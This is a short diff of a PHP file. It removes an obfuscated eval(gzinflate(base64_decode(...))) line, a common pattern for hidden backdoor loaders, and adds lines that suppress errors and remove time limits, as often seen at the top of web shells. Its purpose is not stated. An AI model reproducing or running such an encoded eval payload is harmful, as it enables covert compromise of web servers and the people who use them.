@@ -1,5 +1,6 @@
 <?php
-eval(gzinflate(base64_decode("jZBBa8JAEIXvhf6HYRHWgpiC4MEiVOoePGjaGL0UWWKcZrcm2bAzUGnrf+/GUEp76mlg3sz3Zh4ha7YV6tJWlvu3N3fXV+i989pj4zzbuuiavb0jginId8L8vqhOw9xVshVOusnYBEkY5mYSRQKG0NNrlWxV8iy7qlezpZK7X0qinjZqnepNspC7lmSblpIdCQkm8AHf6DN8wuIRZoeDR+ok8Ye0jFOlZ/N5cvEQcBYBWGW27F8OH4BYYz4ej8lgWYoBBK/Q+w/n8nxuMD+Opj+T8/hhs1SrVCdxnHazUQhmaLgqBbQrjCcehX9ebIm6CDHnrmasmfqyzYlCUIVxxHtbhyijJiPGiMyrd5HP3mRr+wU=")));
+@error_reporting(0);
+@set_time_limit(0);
 	if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 		@set_magic_quotes_runtime(0);
 }
